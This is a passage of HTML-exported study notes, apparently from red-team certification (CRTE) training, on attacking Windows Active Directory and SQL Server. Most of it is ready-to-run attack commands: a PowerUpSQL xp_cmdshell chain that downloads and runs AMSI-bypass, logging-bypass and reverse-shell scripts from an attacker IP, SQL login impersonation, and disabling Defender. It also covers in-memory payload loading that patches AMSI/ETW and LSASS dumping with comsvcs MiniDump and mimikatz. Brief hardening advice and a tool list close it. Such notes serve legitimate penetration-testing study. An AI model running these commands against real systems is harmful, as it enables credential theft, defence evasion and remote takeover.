Enter-PSSession &lt;PROD_FOREST_IP_ADDRESS&gt; -Authentication NegotiateWithImplicitCredential</code></pre><ul id="1c5afa96-5343-4eeb-bb07-9daab82fc99b" class="bulleted-list"><li style="list-style-type:disc">note when PSRemoting using an IP address, you must use NTLM authentication</li></ul><ul id="b475b790-4811-4969-8bdd-c7829fa605b8" class="bulleted-list"><li style="list-style-type:disc">you can then use <code>Copy-Item -Path C:\Windows\System32\lsass.exe -FromSession $prodsession -Destination &#x27;C:\Users\Administrator\lsass.exe&#x27;</code> to copy the lsass.exe file on the remote session to the local machine</li></ul><h2 id="46ddd562-8adb-41a4-a62c-188b19c53633" class="">MSSQL</h2><p id="452a9c53-4fe6-4d6c-9f15-5792253d6822" class="">Use <code>Invoke-SQLAudit</code> to find misconfigurations in SQL server</p><h3 id="aea80314-f25c-4923-8339-13c4fd3de701" class="">Getting Shell on SQL Instance</h3><ul id="edabac04-d2a1-4d84-91bf-49b79200f456" class="bulleted-list"><li style="list-style-type:disc">run this command from PowerUpSQL to get a reverse shell on target_machine <code>Get-SQLServerLinkCrawl -Instance us-mssql -Query &#x27;exec master..xp_cmdshell &#x27;&#x27;powershell.exe -c &quot;iex(iwr -UseBasicParsing &lt;ATACKER_IP&gt;/amsibypass.txt);iex(iwr -UseBasicParsing &lt;ATACKER_IP&gt;/sbloggingbypass.txt);iex(iwr -UseBasicParsing &lt;ATACKER_IP&gt;/reverse.ps1)&quot;&#x27;&#x27;&#x27; |select -ExpandProperty CustomQuery</code><ul id="af6c0f59-b6a8-4d87-be52-b1103fa9d45e" class="bulleted-list"><li style="list-style-type:circle">this requires <code>rpcout</code> and <code>xp_cmdshell</code> to be enabled on the SQL machine</li></ul><ul id="d08df4ef-d213-4c9c-8c46-37333e1704d6" class="bulleted-list"><li style="list-style-type:circle">can manually enabled <code>rpcout</code> and <code>xp_cmdshell</code> on a SQL node as long as the user on which the target node is run is high-privileged (such as sa [system administrator]) </li></ul></li></ul><ul id="c0b69fa1-2f71-404c-a303-58764422105a" class="bulleted-list"><li style="list-style-type:disc">use <code>Get-SQLInstanceDomain | Get-SQLServerInfo</code> to get information for SQL instances in current forest</li></ul><p id="6de71751-0b16-4f9d-9370-f856b749383b" class=""><strong>Enable RPC on SQL machine</strong></p><pre id="1dfa402a-ef31-44a4-9b27-6ed0a967744e" class="code"><code>Invoke-SqlCmd -Query &quot;exec sp_serveroption @server=&#x27;target-sqlsrv&#x27;, @optname=&#x27;rpc&#x27;, @optvalue=&#x27;TRUE&#x27;&quot;
Invoke-SqlCmd -Query &quot;exec sp_serveroption @server=&#x27;target-sqlsrv&#x27;, @optname=&#x27;rpc out&#x27;, @optvalue=&#x27;TRUE&#x27;&quot;
Invoke-SqlCmd -Query &quot;EXECUTE (&#x27;sp_configure &#x27;&#x27;show advanced options&#x27;&#x27;,1;reconfigure;&#x27;) AT &quot;&quot;target-sqlsrv&quot;&quot;&quot;
Invoke-SqlCmd -Query &quot;EXECUTE(&#x27;sp_configure &#x27;&#x27;xp_cmdshell&#x27;&#x27;,1;reconfigure&#x27;) AT &quot;&quot;target-sqlsrv&quot;&quot;&quot;</code></pre><h3 id="da26d21c-7aad-4be4-86e1-00a8089d09b7" class="">User Impersonation</h3><p id="859c2159-7a59-43c7-b189-87e5c0a1ee1a" class="">May be possible to impersonate other users within an SQL instance if given the IMPERSONATE privilege and EXECUTE AS function.</p><ul id="7df856d9-9bd7-4844-8e0c-524bf230bbd5" class="bulleted-list"><li style="list-style-type:disc">to find users you can impersonate, run <code>Get-SQLquery -Instance target-sqlsrv -Query &quot;SELECT distinct </code><code><a href="http://b.name/">b.name</a></code><code> FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = &#x27;IMPERSONATE&#x27;&quot;</code></li></ul><ul id="555f9585-57a6-477f-9081-75224d870df3" class="bulleted-list"><li style="list-style-type:disc">use SQLRecon.exe for impersonation, as they have modules meant exactly for such a scenario</li></ul><p id="b0a3baef-d1c5-47d5-ac5d-68e776589542" class=""><strong>Performing Impersonation with SQLRecon</strong></p><pre id="20e23087-28ad-4354-ad6d-5da624fff696" class="code"><code># Enabling advanced options
SQLRecon.exe -a Windows -s target-sqlsrv -m iquery -i sa -o &quot;EXEC sp_configure &#x27;show advanced options&#x27;,1 RECONFIGURE&quot;

# Enabling xp_cmdshell
SQLRecon.exe -a Windows -s target-sqlsrv -m iquery -i sa -o &quot;EXEC sp_configure &#x27;xp_cmdshell&#x27;,1 RECONFIGURE&quot;

# Running whoami on target
SQLRecon.exe -a Windows -s target-sqlsrv -m iquery -i sa -o &quot;EXEC master..xp_cmdshell &#x27;whoami&#x27;&quot;</code></pre><ul id="6142f081-201a-45c5-a12c-33eb232fdbf9" class="bulleted-list"><li style="list-style-type:disc">note that you can also use PowerView’s <code>Get-SQLquery -Instance target-sqlsrv -Query &quot;EXECUTE AS LOGIN = &#x27;sa&#x27; EXEC master..xp_cmdshell &#x27;whoami&#x27;&quot;</code></li></ul><h1 id="d50bb2c3-f4c6-495f-b132-f51fe983632b" class="">Offensive .NET</h1><table id="437c43b4-ee42-4618-9bcf-95dc73ffc9b1" class="simple-table"><tbody><tr id="85baa4f7-6628-4a29-b49a-aed28a0e3f3e"><td id=";{au" class="" style="width:370.00001525878906px"><strong>Pros</strong></td><td id="B=FK" class="" style="width:323.00000762939453px"><strong>Cons</strong></td></tr><tr id="a9dd3151-6f7c-4387-b8de-61287ced01e9"><td id=";{au" class="" style="width:370.00001525878906px"><code>System.Management.Automation.dll</code> lacks some security features for .NET applications / binaries</td><td id="B=FK" class="" style="width:323.00000762939453px">Potentially detected by AV / EDR</td></tr><tr id="d9477cda-d254-42a7-8d91-8e42212c1d84"><td id=";{au" class="" style="width:370.00001525878906px"></td><td id="B=FK" class="" style="width:323.00000762939453px">Harder to deliver payload (need additional script for loading it into memory)</td></tr><tr id="2e872515-fa72-40a8-b179-62fb73a25e56"><td id=";{au" class="" style="width:370.00001525878906px"></td><td id="B=FK" class="" style="width:323.00000762939453px">New process creation, can be detected by blue team</td></tr></tbody></table><ul id="741175fb-6538-4460-bdb3-f112cfb41b44" class="bulleted-list"><li style="list-style-type:disc">use <a href="https://github.com/Flangvik/NetLoader">NetLoader </a>to deliver binary payloads and execute it directly in memory while bypassing AMSI &amp; ETW by patching them <ul id="c45dd031-d30c-4c25-b503-1b4e7372929d" class="bulleted-list"><li style="list-style-type:circle">use port forwarding to indirectly load the binary from a remote address (check  <a href="https://0xd4y.com/2023/04/05/CRTP-Notes/">https://0xd4y.com/2023/04/05/CRTP-Notes/</a> to see how to do that)</li></ul></li></ul><ul id="d35bc4b9-aa52-43cd-a44e-5b81d2c7f758" class="bulleted-list"><li style="list-style-type:disc">NetLoading an unsigned binary such as SafetyKatz may not work if WDAC is enabled, which would result in an error such as <code>The system cannot execute the specified program</code> (check with <code>Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard</code>) <ul id="63f9da47-624e-4300-824d-8a759883accb" class="bulleted-list"><li style="list-style-type:circle">use <code>rundll32.exe</code> to dump the LSASS process and then exfiltrate it (detected by Defender so make sure to turn it off with <code>Set-MpPreference -DisableRealTimeMonitoring $true</code>)</li></ul><pre id="7503321d-0bea-4fcb-b735-6e476df6b4b3" class="code"><code># Get lsass PID
tasklist /FI &quot;IMAGENAME eq lsass.exe&quot;

# Suppose the lsass pid is 716
rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump 716 C:\PATH\TO\SAVE\lsass.dmp full

# Copy lsass.dmp to current machine
echo F | xcopy \\target_machine\C$\PATH\TO\lsass.dmp C:\PATH\TO\SAVE\lsass.dmp

# Dump creds from lsass.dmp
sekurlsa::minidump C:\PATH\TO\lsass.dmp 
sekurlsa::ekeys</code></pre></li></ul><h1 id="938c3f5d-5c1f-4705-9891-eefdf05a985d" class="">Best Practices</h1><ul id="7e68f01a-b849-4e13-b4cc-49f9408c8f7e" class="bulleted-list"><li style="list-style-type:disc">set <code>Account is sensitive and cannot be delegated</code> for sensitive accounts</li></ul><ul id="22c13d62-1d5b-4590-aabe-7c3d0cfbc473" class="bulleted-list"><li style="list-style-type:disc">never run services with DA privileges</li></ul><h2 id="ebc6f854-cad0-44e3-8494-fdd3e150b1c5" class="">Privileged Administrative Workstation (PAWs)</h2><ul id="1da67866-87a1-4730-bb27-db9455baeff7" class="bulleted-list"><li style="list-style-type:disc">workstation for performing sensitive tasks</li></ul><ul id="4462023f-fdb3-4efb-b186-99cb21a4c533" class="bulleted-list"><li style="list-style-type:disc">provides protection against attacks such as phishing , OS vulnerabilities, and credential replay attacks</li></ul><h2 id="6325babd-768e-44b6-a998-b389c899aef8" class="">Just Enough Administration (JEA)</h2><ul id="cd62c5bd-e32a-48eb-94f2-8b0f290ceca2" class="bulleted-list"><li style="list-style-type:disc">role-based access control for PS remote delegation administration</li></ul><ul id="e28f4710-8fd3-4168-a761-2f1112900b2f" class="bulleted-list"><li style="list-style-type:disc">restricts non-admin users to remotely connect to machine for specific administrative tasks<ul id="6d10781b-d7de-4689-a05a-dc6ffc0ddd05" class="bulleted-list"><li style="list-style-type:circle">can control command user runs and parameters</li></ul></li></ul><ul id="571d0601-bf3d-4d75-b7ed-38f96ae0b0f4" class="bulleted-list"><li style="list-style-type:disc">PS transcription and logging is enabled on JEA endpoints</li></ul><h1 id="605554b9-0c4f-4f2e-933f-d3f675d52357" class="">Tools</h1><ol type="1" id="b05dd09c-70e0-494c-ace7-7dd526a37f0d" class="numbered-list" start="1"><li><a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a><ul id="cb9e3833-e92b-41a1-babc-4cccb2e53953" class="bulleted-list"><li style="list-style-type:disc">useful for enumeration in penetration tests (finding exploitation pathways)</li></ul></li></ol><ol type="1" id="2754c311-3303-460e-ba60-84e31606f76a" class="numbered-list" start="2"><li><a href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a><ul id="49c4851b-7017-4144-bbcc-7e556738ae8e" class="bulleted-list"><li style="list-style-type:disc">PowerView and PowerUp<ul id="63bc1754-5335-4767-b93d-f5780e2115ef" class="bulleted-list"><li style="list-style-type:circle">useful for enumeration and finding / exploiting privesc pathways</li></ul></li></ul></li></ol><ol type="1" id="be2d685c-6774-4861-a1be-b7b0f9d7ba89" class="numbered-list" start="3"><li><a href="https://github.com/samratashok/ADModule">ADModule</a><ul id="3be16e2e-b969-400e-8278-af62f35db8fd" class="bulleted-list"><li style="list-style-type:disc">enumeration - signed by Microsoft</li></ul></li></ol><ol type="1" id="b325d1e3-42d5-44cc-810d-fd59cb23c9a5" class="numbered-list" start="4"><li><a href="https://github.com/NetSPI/PowerUpSQL">PowerUpSQL</a><ul id="ba5f53a8-f315-49fe-b267-b4e4dabd022e" class="bulleted-list"><li style="list-style-type:disc">toolkit for attacking SQL servers</li></ul></li></ol><ol type="1" id="a82f3caa-964d-4d1d-9d6b-9c99447194f7" class="numbered-list" start="5"><li><a href="https://github.com/p3nt4/PowerShdll">PowerShdll</a>, <a href="https://github.com/bitsadmin/nopowershell">nopowershell</a>, and <a href="https://github.com/OmerYa/Invisi-Shell">Invisi-Shell</a><ul id="1b334e5b-5737-43cc-9ba5-c0c1f1c6e1aa" class="bulleted-list"><li style="list-style-type:disc">useful for bypassing some PowerShell defenses, logging, and staying stealthy</li></ul></li></ol><ol type="1" id="e6c65524-323d-48f5-8d01-f2f1f1baea33" class="numbered-list" start="6"><li><a href="https://github.com/Flangvik/NetLoader">NetLoader</a><ul id="43ad299e-813e-487e-add2-8da91fdbb4b0" class="bulleted-list"><li style="list-style-type:disc">used for loading executables from memory while bypassing EDR solutions</li></ul></li></ol><ol type="1" id="6497bebc-4ccd-46a8-af01-af4aed6e6e6f" class="numbered-list" start="7"><li><a href="https://github.com/leechristensen/SpoolSample">SpoolSample</a><ul id="1b4a36b9-93fb-4f3c-87be-3f68bd8e465d" class="bulleted-list"><li style="list-style-type:disc">contains binary (MS-RPRN.exe) used for abusing print spooler bug</li></ul></li></ol><ol type="1" id="70736121-b29a-42cf-a50c-246551dd9584" class="numbered-list" start="8"><li><a href="https://github.com/GhostPack/Certify">Certify</a><ul id="5c5b82fe-60f0-44f6-9cd6-a57bbe6bcf3a" class="bulleted-list"><li style="list-style-type:disc">AD CS exploitation</li></ul></li></ol><ol type="1" id="219d485d-1756-43fb-b7e0-4e45a5964f89" class="numbered-list" start="9"><li><a href="https://github.com/GhostPack/Rubeus">Rubeus</a><ul id="cf9c3b39-71dc-4551-ad74-7dae4623a2ae" class="bulleted-list"><li style="list-style-type:disc">Kerberos abuse</li></ul></li></ol><ol type="1" id="9bd8d183-dffa-41ba-a05b-b3cc14bdd46f" class="numbered-list" start="10"><li><a href="https://github.com/skahwah/SQLRecon">SQLRecon</a><ul id="0560e729-0ae1-4e1e-9525-42887971fd2b" class="bulleted-list"><li style="list-style-type:disc">SQL impersonation and exploiting SQL misconfigurations</li></ul></li></ol><ol type="1" id="92e26dc9-1531-48c0-843b-804ebddb87b7" class="numbered-list" start="11"><li><a href="https://github.com/nicocha30/ligolo-ng">Ligolo-ng</a><ul id="52adca5d-3822-4d48-afe8-620a5aa288ab" class="bulleted-list"><li style="list-style-type:disc">Tunneling/pivoting </li></ul></li></ol><h1 id="c8142763-5b42-4526-afb4-875e4d0662de" class="">References</h1><ol type="1" id="e745aea8-5407-403d-8a07-64dc4fbafd39" class="numbered-list" start="1"><li>CRTE Course<ul id="04261942-f0a6-430a-a3cf-029c014ae22f" class="bulleted-list"><li style="list-style-type:disc">main source</li></ul></li></ol><ol type="1" id="fac0de63-69f8-42af-b1b1-996c51b40370" class="numbered-list" start="2"><li><a href="https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/prevent-changes-to-security-settings-with-tamper-protection?view=o365-worldwide">https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/prevent-changes-to-security-settings-with-tamper-protection?view=o365-worldwide</a><ul id="462f7979-3d08-42ad-a184-c707586a5dc8" class="bulleted-list"><li style="list-style-type:disc">tamper protection</li></ul></li></ol><ol type="1" id="f48b5b23-5926-456c-a5aa-81587f099c20" class="numbered-list" start="3"><li><a href="https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/">https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/</a><ul id="3bf61a47-41ed-4f75-8ca0-fdbc4d597923" class="bulleted-list"><li style="list-style-type:disc">SQL impersonation</li></ul><ul id="a85a3fd4-7e25-425f-8210-8868382b8411" class="bulleted-list"><li style="list-style-type:disc">Exploiting SQL server misconfigurations</li></ul></li></ol></div></article></body></html>
